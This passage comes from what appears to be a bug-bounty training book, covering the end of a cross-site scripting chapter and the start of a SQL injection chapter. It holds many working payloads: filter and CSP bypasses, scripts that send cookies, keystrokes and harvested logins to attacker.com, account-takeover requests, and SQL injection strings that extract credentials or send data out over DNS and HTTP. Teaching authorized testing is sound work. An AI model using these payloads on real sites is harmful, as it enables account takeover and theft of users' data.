|**Source**|In DOM XSS, where the user-controlled data originates (URL, cookie, postMessage, etc.)|
|**Content Security Policy (CSP)**|An HTTP header that restricts what scripts can run in the browser|
|**HTML context**|Injection point is inside HTML tags|
|**Attribute context**|Injection point is inside an HTML attribute value|
|**JavaScript context**|Injection point is inside a `<script>` block|
|**URL context**|Injection point is inside an `href` or `src` attribute|
|**Encoding**|Converting characters to a safe representation (HTML entities, URL encoding, etc.)|
|**Sanitization**|Removing or neutralizing dangerous characters from input|
|**Filter bypass**|A technique to evade XSS filters or WAFs|
|**XSS Hunter**|A tool/service for detecting blind XSS by triggering callbacks|
|**Clickjacking**|A related attack where a victim is tricked into clicking hidden elements|

---

## Theory

### Why XSS Exists

Browsers trust every script that comes from a domain. If `https://bank.com` sends JavaScript to your browser, your browser executes it with full access to the `bank.com` session — cookies, local storage, the DOM, everything.

XSS tricks a web application into including attacker-controlled JavaScript in its responses. When a victim loads that response, their browser executes the attacker's script with the same trust it would extend to the application's own code.

The attacker does not break into the server. They break into the _browser's view of the server_.

### The Browser's Parsing Pipeline

To understand XSS deeply, you must understand how a browser turns a string of bytes into a running page:

```
Raw HTML bytes
      │
      ▼
 HTML Parser
 (builds the DOM tree)
      │
      ▼
 CSS Parser
 (builds CSSOM)
      │
      ▼
 JavaScript Engine
 (executes <script> blocks and event handlers)
      │
      ▼
 Rendered Page
```

XSS hijacks this pipeline. If you can inject content that the HTML parser interprets as a `<script>` tag, or as an event handler attribute, or as a JavaScript URL — the JavaScript engine will execute it.

The injection context determines _which_ injection technique works.

---

## Type 1: Reflected XSS

### How It Works

The server takes user input (typically from a URL parameter or form field), and includes it — unsanitized — directly in the HTML response.

```
Attacker crafts URL:
https://example.com/search?q=<script>alert(1)</script>

Server generates response:
<html>
  <body>
    <h1>Search results for: <script>alert(1)</script></h1>
  </body>
</html>

Browser parses response → executes <script>alert(1)</script>
```

The payload is "reflected" off the server and executed in the victim's browser. The attacker must trick the victim into clicking the crafted URL — via phishing, a shortened link, or a redirect.

### Finding Reflected XSS

**Step 1: Identify reflection points**

Any place where input appears in the response is a potential reflection point. Look for:

- Search boxes (`?q=`, `?search=`, `?query=`)
- Error messages ("User 'YOURVALUE' not found")
- Username/profile fields displayed back
- URL parameters reflected in page content
- HTTP headers reflected in responses (User-Agent, Referer, X-Forwarded-For)

**Step 2: Determine the injection context**

Before sending any payload, send a benign unique string and look for where it appears:

```
Test value: xsscanary12345
```

Search the response for `xsscanary12345`. Note where it appears:

```html
<!-- Context 1: Between HTML tags -->
<p>You searched for: xsscanary12345</p>

<!-- Context 2: Inside an attribute -->
<input value="xsscanary12345">

<!-- Context 3: Inside a JavaScript block -->
<script>var query = "xsscanary12345";</script>

<!-- Context 4: Inside an HTML comment -->
<!-- Query: xsscanary12345 -->

<!-- Context 5: Inside a URL attribute -->
<a href="/results?q=xsscanary12345">
```

Each context requires a different payload.

**Step 3: Craft context-appropriate payload**

### Payloads by Injection Context

#### Context 1: Between HTML tags

You are injecting directly into the document body. Standard `<script>` tags and event handler tags work here.

```html
<!-- Basic -->
<script>alert(document.domain)</script>

<!-- Using img tag (no script tag needed) -->
<img src=x onerror=alert(document.domain)>

<!-- Using svg -->
<svg onload=alert(document.domain)>

<!-- Using details/summary (useful when script/img are blocked) -->
<details open ontoggle=alert(document.domain)>

<!-- Using body tag -->
<body onload=alert(document.domain)>

<!-- Using video -->
<video src=x onerror=alert(document.domain)>

<!-- Using audio -->
<audio src=x onerror=alert(document.domain)>

<!-- Using input -->
<input autofocus onfocus=alert(document.domain)>

<!-- Using select -->
<select autofocus onfocus=alert(document.domain)>

<!-- Using textarea -->
<textarea autofocus onfocus=alert(document.domain)>
```

#### Context 2: Inside an HTML attribute

Your input is inside an attribute value. You need to break out of the attribute first:

```html
<!-- Original: <input value="YOUR_INPUT"> -->

<!-- Break out of the attribute, add event handler -->
"><img src=x onerror=alert(document.domain)>

<!-- If double quotes are escaped, try single quotes -->
<!-- Original: <input value='YOUR_INPUT'> -->
'><img src=x onerror=alert(document.domain)>

<!-- If you're already inside an event handler attribute -->
<!-- Original: <div onmouseover="doSomething('YOUR_INPUT')"> -->
');alert(document.domain)//

<!-- If inside href attribute -->
<!-- Original: <a href="YOUR_INPUT"> -->
javascript:alert(document.domain)
```

#### Context 3: Inside a JavaScript string

Your input is reflected inside a JavaScript string literal. Break out of the string:

```javascript
// Original: var query = "YOUR_INPUT";
// Payload:
"-alert(document.domain)-"
// Result: var query = ""-alert(document.domain)-"";

// Or terminate the script block
</script><script>alert(document.domain)//

// If inside a single-quoted string
// Original: var query = 'YOUR_INPUT';
'-alert(document.domain)-'

// If inside a template literal
// Original: var query = `YOUR_INPUT`;
`-alert(document.domain)-`

// Numeric context (no quotes needed)
// Original: var id = YOUR_INPUT;
1;alert(document.domain)//
```

#### Context 4: Inside an HTML comment

```html
<!-- Original: <!-- Query: YOUR_INPUT --> -->
<!-- Payload: -->
--><script>alert(document.domain)</script><!--
```

#### Context 5: Inside a URL attribute (href/src/action)

```html
<!-- Standard JavaScript URL -->
javascript:alert(document.domain)

<!-- URL-encoded version (if the application decodes URLs) -->
javascript&#58;alert(document.domain)

<!-- For data: URIs (if allowed) -->
data:text/html,<script>alert(document.domain)</script>
```

---

## Type 2: Stored XSS

### How It Works

The payload is saved to the server (in a database, file, or cache) and rendered to every user who views the affected content. This is far more dangerous than reflected XSS — you do not need the victim to click a special URL. They simply visit the application normally.

```
Attacker submits:
POST /comments
body=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

Server saves to database.

Victim visits page with comments:
<div class="comment">
  <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
</div>

Victim's browser executes the script → cookie sent to attacker.
```

### Where Stored XSS Lives

Every feature where user input is saved and later displayed to other users is a candidate:

|Feature|What to test|
|---|---|
|Comments / reviews|Comment body, username displayed with comment|
|Profile fields|Display name, bio, website URL, avatar alt text|
|Forum posts / threads|Post body, thread title, signature|
|Messaging / chat|Message content, subject line|
|File uploads|Filename displayed in the UI|
|Support tickets|Ticket title, description (especially if admins view it)|
|Address / billing fields|Address displayed on orders/invoices|
|Admin notifications|Anything that triggers a notification to admins|
|Webhooks / API names|Names of configured integrations|
|Search saved queries|Saved search names|

### Finding Stored XSS

For each feature above:

1. Submit a harmless marker: `xsstest-FEATURENAME-001`
2. Find everywhere this value is displayed
3. Determine the rendering context (as above)
4. Submit the appropriate payload
5. Navigate to where the output is displayed — both as the same user and as a different user (or logged out)

---

## Type 3: DOM-Based XSS

### How It Works

DOM XSS occurs entirely in the browser. The server's response may be completely safe — the vulnerability is in the client-side JavaScript that reads attacker-controlled data and writes it unsafely to the DOM.

```javascript
// Vulnerable code in the application's JS:
var name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = "Hello, " + name;

// Attack URL:
// https://example.com/welcome?name=<img src=x onerror=alert(document.domain)>

// The server never sees the payload (it's in a parameter the JS reads).
// The JS writes it unsafely to innerHTML → XSS.
```

The server's response is the same for everyone. The attack is purely in how the JS processes URL data.

### Sources and Sinks

**Sources** — where attacker-controlled data comes from:

```javascript
location.search          // URL query string (?param=value)
location.hash            // URL fragment (#value) — never sent to server
location.pathname        // URL path
document.referrer        // Referring URL
document.cookie          // Cookie values
window.name              // Window name property
localStorage / sessionStorage
postMessage              // Cross-origin messages
```

**Sinks** — where data ends up that causes execution:

```javascript
// HTML injection sinks
element.innerHTML = ...
element.outerHTML = ...
document.write(...)
document.writeln(...)

// JavaScript execution sinks
eval(...)
setTimeout("string", ...)    // Only dangerous with string argument
setInterval("string", ...)
new Function(...)
element.setAttribute('onclick', ...)

// URL-based sinks
location.href = ...
location.assign(...)
location.replace(...)
element.src = ...
element.action = ...

// jQuery sinks (extremely common in older apps)
$().html(...)
$().append(...)
$().prepend(...)
$.parseHTML(...)
```

### Finding DOM XSS

**Manual approach:**

1. Open DevTools → Sources tab
2. Search all JS files for dangerous sinks: `innerHTML`, `document.write`, `eval`, `location.href`
3. Trace back where the data comes from
4. Test if you can control that source

```bash
# Search for sinks in downloaded JS files
grep -r "innerHTML\|document\.write\|eval\|location\.href" js_files/ | grep -v "\.min\.js"
```

**Using DOM Invader (Burp Suite):**

Burp Suite's browser has DOM Invader built in. Enable it in the extension settings:

1. Open Burp's browser
2. Click the DOM Invader icon (looks like a bug)
3. Enable DOM Invader
4. Browse the application
5. DOM Invader automatically identifies sources and sinks and highlights exploitable paths

**Common DOM XSS patterns to look for:**

```javascript
// Pattern 1: Hash-based routing
window.location.hash → innerHTML

// Pattern 2: URL parameter to page title
document.title = "Results for " + getParam('q');
// Then: $('h1').html(document.title);  ← innerHTML via jQuery!

// Pattern 3: JSON.parse with location.search
var data = JSON.parse(atob(location.hash.slice(1)));
document.getElementById('name').innerHTML = data.name;

// Pattern 4: postMessage without origin check
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
```

---

## Type 4: Blind XSS

### How It Works

Blind XSS is stored XSS that fires in a context you cannot directly observe — typically an admin panel, a support ticket system, a log viewer, or an email notification.

You submit a payload, close the browser, and later receive a notification (via a callback to your server) that it fired.

### Setting Up XSS Hunter

XSS Hunter (xsshunter.trufflesecurity.com) provides a unique subdomain that receives callbacks when your blind XSS payloads fire. Each callback includes:

- Screenshot of the page where it fired
- Cookies at the time of execution
- URL where it fired
- DOM content
- HTTP headers

```javascript
// XSS Hunter payload (replace with your subdomain)
"><script src=https://YOUR_SUBDOMAIN.xss.ht></script>

// Alternative: inline payload with fetch callback
"><script>
fetch('https://YOUR_SUBDOMAIN.xss.ht/?c='+btoa(document.cookie)+'&u='+btoa(location.href))
</script>
```

### Where to Test Blind XSS

Submit blind XSS payloads in every field that might be viewed by admins or staff:

- Contact forms
- Support ticket subject and body
- "Report this content" forms
- User-Agent header (if logs are viewed in a web UI)
- Referer header
- X-Forwarded-For header
- Username / display name (if admins have a user management panel)
- Order notes / shipping instructions
- Product reviews (if an admin approves them)
- File upload filenames

---

## XSS Filter Bypasses

Applications and WAFs often attempt to block XSS. Here are techniques to bypass common filters:

### Case Variation

```html
<!-- If "script" is blocked -->
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
<Script>alert(1)</Script>
```

### Broken/Malformed Tags

Some parsers are lenient about malformed HTML:

```html
<img src=x onerror=alert(1)
<img src=x onerror=alert(1)//
<<script>alert(1);//<</script>
```

### Alternative Event Handlers

If `onerror` and `onload` are blocked:

```html
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
```

### Encoding Bypasses

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>

<!-- HTML entity encoding (hex) -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>

<!-- JavaScript unicode escapes -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061lert(1)>
```

### String Obfuscation

```javascript
// Avoid the word "alert"
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>
// (Base64 of alert(document.domain))

// Using String.fromCharCode
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

// Using concatenation
<script>window['al'+'ert'](1)</script>

// Using template literals
<script>`${alert(1)}`</script>
```

### Tag Attribute Tricks

```html
<!-- Spaces can sometimes be replaced -->
<img/src=x/onerror=alert(1)>
<img	src=x	onerror=alert(1)>  <!-- Tab characters -->

<!-- Null bytes (browser ignores, filter doesn't) -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Comment injection -->
<sc<!---->ript>alert(1)</sc<!---->ript>
```

### CSP Bypasses

When a Content Security Policy is present, standard script injection is blocked. Common bypasses:

```javascript
// If script-src allows 'unsafe-inline' (common misconfiguration)
// Standard payloads work

// If script-src allows a CDN like cdnjs.cloudflare.com
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csr-nonce="">{{constructor.constructor('alert(document.domain)')()}}</div>

// If script-src allows *.googleapis.com
// AngularJS JSONP gadget

// If there's a JSONP endpoint on an allowed domain
// Use it to execute arbitrary JS

// Check CSP for weaknesses at:
// https://csp-evaluator.withgoogle.com/
```

---

## Real Impact: Beyond alert(1)

Proving XSS with `alert(1)` shows the vulnerability exists. For a compelling bug report, demonstrate real impact.

### Session Hijacking (Cookie Theft)

```javascript
// Send victim's cookies to attacker's server
<script>
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>

// Using fetch (more reliable)
<script>
fetch("https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));
</script>
```

Note: `HttpOnly` cookies cannot be read by JavaScript. If the session cookie is `HttpOnly`, demonstrate the attack differently (see below).

### Account Takeover Without Cookie Access

If the session cookie is `HttpOnly`, you can still take over accounts by performing authenticated actions:

```javascript
// Change victim's email address
<script>
fetch('/api/user/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>

// Extract CSRF token and change password
<script>
fetch('/settings')
  .then(r => r.text())
  .then(html => {
    var csrf = html.match(/name="csrf_token" value="([^"]+)"/)[1];
    return fetch('/settings/password', {
      method: 'POST',
      credentials: 'include',
      body: new URLSearchParams({
        csrf_token: csrf,
        new_password: 'hacked123',
        confirm_password: 'hacked123'
      })
    });
  });
</script>
```

### Credential Harvesting (Phishing Within Trusted Domain)

```javascript
// Inject a fake login form over the real page
<script>
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">' +
  '<h2>Session expired. Please log in again.</h2>' +
  '<form onsubmit="steal(event)">' +
  '<input type="email" name="email" placeholder="Email"><br>' +
  '<input type="password" name="password" placeholder="Password"><br>' +
  '<input type="submit" value="Log In">' +
  '</form></div>';

function steal(e) {
  e.preventDefault();
  var data = new FormData(e.target);
  fetch('https://attacker.com/harvest?' + new URLSearchParams(data));
}
</script>
```

### Keylogging

```javascript
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
</script>
```

### Browser-Based Port Scanning (Pivoting to Internal Network)

```javascript
// From the victim's browser, scan internal network
<script>
['192.168.1.1','192.168.1.254','10.0.0.1','172.16.0.1'].forEach(function(ip) {
  var img = new Image();
  img.onload = function() { fetch('https://attacker.com/scan?found='+ip); }
  img.src = 'http://' + ip + '/favicon.ico';
});
</script>
```

### Capturing Screenshots (using html2canvas if loaded)

```javascript
<script>
// If html2canvas is already loaded by the application
html2canvas(document.body).then(function(canvas) {
  fetch('https://attacker.com/screenshot', {
    method: 'POST',
    body: canvas.toDataURL()
  });
});
</script>
```

---

## Practical Methodology

### Step-by-Step XSS Testing Process

```
1. MAP INPUT POINTS
   │
   ├── URL parameters (?q=, ?search=, ?id=)
   ├── Form fields (search boxes, profile fields, comments)
   ├── HTTP headers (User-Agent, Referer, X-Forwarded-For)
   ├── JSON body parameters (API requests)
   └── File upload filenames

2. PROBE FOR REFLECTION
   │
   └── Send: xsscanary12345
       └── Search response for xsscanary12345
           ├── Found? → Determine context → Step 3
           └── Not found? → Check if stored (visit another page/user)

3. DETERMINE CONTEXT
   │
   ├── Between HTML tags → Use <script> or event handler tags
   ├── Inside attribute → Break out with "><payload>
   ├── Inside JS string → Break out with ";payload//
   ├── Inside URL attr → Use javascript: scheme
   └── Inside comment → Close with -->

4. TEST BASIC PAYLOAD
   │
   └── <script>alert(document.domain)</script>
       ├── Executes? → VULNERABILITY CONFIRMED → Step 6
       └── Blocked? → Step 5

5. BYPASS FILTERS
   │
   ├── Try alternative tags (img, svg, details)
   ├── Try encoding (HTML entities, unicode)
   ├── Try case variations
   ├── Try broken tags
   └── Consult https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

6. DEMONSTRATE REAL IMPACT
   │
   ├── If cookies accessible → Cookie theft payload
   ├── If HttpOnly → CSRF action payload
   └── Document clearly with screenshots
```

---

## Tools

### Automated Scanners

Automated scanners are useful for surface coverage but miss many XSS vulnerabilities. Use them as a starting point, not a conclusion.

```bash
# dalfox — fast, accurate XSS scanner
go install github.com/hahwul/dalfox/v2@latest

# Scan a single URL
dalfox url "https://example.com/search?q=test"

# Scan with custom header
dalfox url "https://example.com/search?q=test" -H "Cookie: session=abc123"

# Scan from a file of URLs
dalfox file parameterized_urls.txt

# Pipe from other tools
cat parameterized_urls.txt | dalfox pipe

# Use blind XSS callback
dalfox url "https://example.com/search?q=test" --blind https://YOUR.xss.ht
```

```bash
# kxss — fast filter tester (checks which characters are reflected unencoded)
go install github.com/Emoe/kxss@latest

cat parameterized_urls.txt | kxss
```

### Manual Testing with Burp Suite

1. Send a request to Burp Repeater
2. Modify the parameter value to your test string
3. View the response — use Ctrl+F to find your string
4. Note the context
5. Craft payload
6. Test in Burp's browser (not just the raw response)

**Important:** Always test in a real browser, not just by reading the raw response. Browsers parse HTML differently from how you read it. A payload that looks blocked in the raw response may still execute.

---

## Lab Exercises

### Lab 1: Basic Reflected XSS

**Environment:** DVWA (Damn Vulnerable Web Application) or PortSwigger Web Security Academy

1. Navigate to the XSS (Reflected) module
2. Submit `<script>alert(document.domain)</script>` in the search box
3. Observe the popup
4. Try the same on the medium security level — the filter blocks `<script>`. Find a bypass.

### Lab 2: Stored XSS

1. Navigate to the XSS (Stored) module
2. In the message field, enter: `<img src=x onerror=alert('Stored XSS: '+document.domain)>`
3. Submit the form
4. Observe that the alert fires when you return to the page — and would fire for any user who views it

### Lab 3: DOM XSS

1. In PortSwigger's DOM XSS labs, find the source → sink path
2. Use DOM Invader to map the flow
3. Craft a payload that reaches the sink from the source

### Lab 4: Blind XSS

1. Set up an XSS Hunter account
2. Find a contact form or support ticket form
3. Submit your XSS Hunter payload in the subject and body
4. Monitor XSS Hunter for a callback

---

## Common Mistakes Beginners Make

|Mistake|Correction|
|---|---|
|Testing only `<script>alert(1)</script>`|Test all payload types for the correct context|
|Giving up after one blocked payload|There are hundreds of bypass techniques|
|Only testing URL parameters|Forms, headers, file names, and JSON bodies are all injection points|
|Not testing stored XSS targets|The highest-impact XSS is usually stored|
|Not testing in a real browser|The browser may execute what the raw response obscures|
|Reporting alert(1) without impact demonstration|Show cookie theft or account takeover|
|Not testing while logged in|Many stored XSS points are behind authentication|

---

## Summary

XSS is the injection of JavaScript into a page that executes in another user's browser. Reflected XSS requires the victim to click a crafted URL. Stored XSS executes for any user who views the affected content. DOM XSS lives entirely in client-side JavaScript. Blind XSS fires in contexts the attacker cannot directly observe. Finding XSS requires identifying reflection points, determining the injection context, and crafting the correct payload. The impact ranges from session hijacking to full account takeover. Always demonstrate real impact beyond `alert(1)` in your reports.

---

## Checklist

- [ ] Identified all input points: URL params, form fields, HTTP headers, JSON bodies
- [ ] Sent canary string and found all reflection points
- [ ] Determined injection context for each reflection point
- [ ] Tested appropriate payload for each context
- [ ] Attempted at least 5 bypass techniques when blocked
- [ ] Tested for stored XSS in all save-and-display features
- [ ] Checked for DOM XSS by reviewing JS for sources and sinks
- [ ] Submitted blind XSS payloads to all admin-facing input fields
- [ ] Confirmed XSS executes in a real browser (not just raw response)
- [ ] Demonstrated real impact (cookie theft, account takeover action, or credential harvest)
- [ ] Noted CSP headers and assessed bypass potential
- [ ] Documented all findings with request/response and screenshot

---

# Chapter 16: SQL Injection

## Objective

Understand SQL injection completely — how relational databases work, why injection occurs, every major technique for detecting and exploiting it, how to use sqlmap effectively, and how to demonstrate impact responsibly in a bug bounty context. SQL injection remains one of the most critical and well-rewarded vulnerability classes.

## Prerequisites

- Chapter 3: HTTP — The Language of the Web
- Chapter 7: Burp Suite — Complete Guide
- Chapter 14: Web Application Mapping
- Basic understanding of what a database is

## Terminology

|Term|Definition|
|---|---|
|**SQL**|Structured Query Language — the language used to communicate with relational databases|
|**Database**|An organized collection of structured data|
|**Table**|A structured data set within a database (like a spreadsheet tab)|
|**Column**|A field in a table (e.g., `username`, `email`, `password`)|
|**Row**|A single record in a table|
|**Query**|A SQL statement sent to the database|
|**DBMS**|Database Management System — the software running the database (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)|
|**SQLi**|SQL Injection — the vulnerability class|
|**In-band SQLi**|Injection where the result is returned in the HTTP response|
|**Error-based SQLi**|Injection that retrieves data through database error messages|
|**Union-based SQLi**|Injection that appends a `UNION SELECT` to retrieve data from other tables|
|**Blind SQLi**|Injection where no data is returned — you infer results from application behavior|
|**Boolean-based blind**|Blind injection that asks true/false questions via application response differences|
|**Time-based blind**|Blind injection that uses sleep/delay functions to infer information|
|**Out-of-Band SQLi**|Injection that exfiltrates data through DNS or HTTP requests|
|**sqlmap**|An open-source automated SQL injection tool|
|**INFORMATION_SCHEMA**|A virtual database in most DBMSes that stores metadata about all databases and tables|
|**Stacked queries**|Executing multiple SQL statements in sequence (DBMS-dependent)|
|**Second-order injection**|User input stored safely but later used unsafely in another query|

---

## Theory

### How SQL Injection Happens

Web applications communicate with databases using SQL queries. A login form might generate:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret';
```

The application builds this query by concatenating user input:

```python
# Vulnerable Python code
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If `username` = `alice` and `password` = `secret`, the query is safe. But if the application does not sanitize input, an attacker can break out of the string context and inject arbitrary SQL:

```
username: admin'--
password: anything
```

The generated query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
```

The `--` is a SQL comment — everything after it is ignored. The query now asks: "Find a user named admin" — with no password check. If a user named `admin` exists, the attacker logs in.

### Why SQLi Still Exists

SQL injection has been known for decades yet remains a top-ranked vulnerability because:

1. String concatenation in queries is still taught in tutorials
2. Legacy codebases that predate parameterized queries
3. Raw queries used for performance or flexibility in ORMs
4. Stored procedures that concatenate internally
5. Second-order injection in complex data pipelines

### The Database Landscape

Different database systems (DBMS) use slightly different syntax. Knowing which DBMS you are targeting determines which payloads work.

|DBMS|Identifies Via|Comment Syntax|String Concat|
|---|---|---|---|
|MySQL|`VERSION()` returns `8.x.x`|`--` or `#`|`CONCAT(a,b)` or `'a' 'b'`|
|PostgreSQL|`VERSION()` returns `PostgreSQL 14`|`--`|`\|`|
|Microsoft SQL Server|`@@VERSION`|`--` or `/**/`|`+`|
|Oracle|`v$version`|`--`|`\|`|
|SQLite|`sqlite_version()`|`--`|`\|`|

---

## Finding SQL Injection

### Step 1: Identify Injection Points

Any parameter that might interact with a database is a candidate:

- URL parameters: `?id=1`, `?user=alice`, `?category=shoes`
- POST body fields: login forms, search boxes, filters
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie` values
- JSON/XML API parameters
- Path segments: `/users/123/profile`
- Search and sort parameters: `?sort=price`, `?order=desc`

### Step 2: Send Probe Characters

Send characters that break SQL syntax and observe the response:

```
'          Single quote — closes a string literal
''         Doubled single quote — escapes a string literal (tests for proper escaping)
`          Backtick (MySQL identifier quoting)
)          Closes a function/parenthesis
'--        Quote + comment (bypasses remainder of query)
' OR '1'='1  Classic boolean test
```

Look for:

- **SQL error messages** — "You have an error in your SQL syntax", "ORA-01756", "pg_query()"
- **Different response size** — page looks different, content changes
- **Application errors** — 500 Internal Server Error where 200 was returned
- **Behavioral differences** — login succeeds where it should fail

```bash
# Quick probe via curl
curl -s "https://example.com/products?id=1'"
curl -s "https://example.com/products?id=1'--"
curl -s "https://example.com/search?q=test'"

# Compare responses
curl -s "https://example.com/user?id=1 AND 1=1" | wc -c   # True condition
curl -s "https://example.com/user?id=1 AND 1=2" | wc -c   # False condition
# Different sizes → boolean-based SQLi
```

---

## SQL Injection Types — Detection and Exploitation

### Type 1: In-Band Error-Based SQLi

The database error message is returned directly in the response, revealing database structure.

**Detection:**

```sql
' 
''
')
'--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--  (MySQL)
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- (MSSQL)
```

**Exploitation (MySQL):**

```sql
-- Get the database version
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--

-- Get current database name
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--

-- List all databases
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata)))--

-- List tables in current database
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

-- Get column names from a specific table
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--

-- Extract data
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))--
```

---

### Type 2: Union-Based SQLi

Append a `UNION SELECT` statement to retrieve data from other tables in the same response.

**Prerequisite:** The number of columns in the injected query must match the original query.

**Step 1: Find the number of columns**

```sql
-- Increment ORDER BY until you get an error
' ORDER BY 1--   → no error
' ORDER BY 2--   → no error
' ORDER BY 3--   → no error
' ORDER BY 4--   → error → query has 3 columns

-- Alternative: NULL padding
' UNION SELECT NULL--          → error (1 column attempt)
' UNION SELECT NULL,NULL--     → error (2 columns)
' UNION SELECT NULL,NULL,NULL-- → success (3 columns confirmed)
```

**Step 2: Find which columns are displayed**

```sql
' UNION SELECT 'A',NULL,NULL--
' UNION SELECT NULL,'A',NULL--
' UNION SELECT NULL,NULL,'A'--
-- The column that shows 'A' in the response is your data extraction point
```

**Step 3: Extract data**

```sql
-- Assuming column 2 is displayed and the DBMS is MySQL

-- Get database version
' UNION SELECT NULL,version(),NULL--

-- Get current database
' UNION SELECT NULL,database(),NULL--

-- List all databases
' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--

-- List tables
' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

-- Get columns of users table
' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract credentials
' UNION SELECT NULL,concat(username,':',password),NULL FROM users LIMIT 0,1--
-- Change LIMIT 0,1 → 1,1 → 2,1 for next records

-- Extract all at once (may be truncated)
' UNION SELECT NULL,group_concat(username,':',password SEPARATOR '\n'),NULL FROM users--
```

---

### Type 3: Boolean-Based Blind SQLi

No data is returned directly. You infer information by asking true/false questions and observing differences in the response (page content, length, status code).

**Detection:**

```sql
' AND 1=1--   → normal response (true condition)
' AND 1=2--   → different response (false condition)
-- If these differ: boolean-based blind injection confirmed
```

**Exploitation — extracting data character by character:**

```sql
-- Is the first character of the database name 's'?
' AND SUBSTRING(database(),1,1)='s'--

-- Is the first character of the database name ASCII value greater than 100?
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Is the first character of the database name ASCII value equal to 115? (= 's')
' AND ASCII(SUBSTRING(database(),1,1))=115--
```

This is tedious manually. Use Burp Intruder to iterate through characters, or use sqlmap.

**Automating with Burp Intruder:**

```
Position:  ' AND ASCII(SUBSTRING(database(),§POSITION§,1))=§ASCII_VALUE§--
Attack type: Pitchfork
Payload 1: Numbers 1-20 (character position)
Payload 2: Numbers 32-126 (printable ASCII range)

Compare response lengths — where length differs from the false condition = correct character
```

---

### Type 4: Time-Based Blind SQLi

No difference in response content — but a deliberate delay reveals a true condition.

**Detection:**

```sql
-- MySQL
' AND SLEEP(5)--           → 5-second delay? → injection confirmed

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND dbms_pipe.receive_message('a',5)--
```

**Exploitation:**

```sql
-- Is the first character of database() equal to 's'? (if true: 5 second delay)
' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--

-- PostgreSQL equivalent
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL equivalent
'; IF (SUBSTRING(DB_NAME(),1,1)='s') WAITFOR DELAY '0:0:5'--
```

---

### Type 5: Out-of-Band (OOB) SQLi

When no HTTP-based indicator is possible, exfiltrate data through DNS or HTTP requests from the database server.

```sql
-- MySQL — DNS exfiltration via LOAD_FILE (requires FILE privilege)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.burpcollaborator.net\\test'))--

-- MSSQL — DNS exfiltration via xp_dirtree
'; exec master..xp_dirtree '\\'+@@version+'.attacker.burpcollaborator.net\test'--

-- Oracle — HTTP exfiltration via UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.burpcollaborator.net/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
```

Set up Burp Collaborator first, then observe DNS/HTTP callbacks confirming injection.

---

### Type 6: Second-Order (Stored) SQLi

The input is stored safely in the database initially (properly escaped), but later retrieved and used unsafely in another query — without re-sanitization.

```
Step 1: Register with username: admin'--
         Application safely inserts: INSERT INTO users (username) VALUES ('admin''--')

Step 2: When the application later uses your stored username in another query:
         UPDATE users SET password='newpass' WHERE username='admin'--'
         The '--' comments out the rest — affecting the admin account instead of yours
```

**Testing for second-order:**

1. Register or create an account with SQL metacharacters in the username/name
2. Find every place the stored value is subsequently used (profile pages, password change, account merge)
3. Observe whether the metacharacters cause database errors or behavioral differences in those later operations

---

## Using sqlmap

sqlmap automates detection and exploitation of SQL injection. It is powerful but must be used responsibly.

